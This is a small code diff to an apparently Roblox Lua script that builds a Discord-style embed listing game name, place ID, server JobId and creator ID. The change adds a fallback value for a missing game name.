@@ -1437,7 +1437,7 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "Game Information",
-            ["value"] = "```\n• Game name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
+            ["value"] = "```\n• Game name: " .. (MarketplaceService:GetProductInfo(game.PlaceId).Name or "500 Internal Server Error") .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
         },
         {
             ["name"] = "Script information",
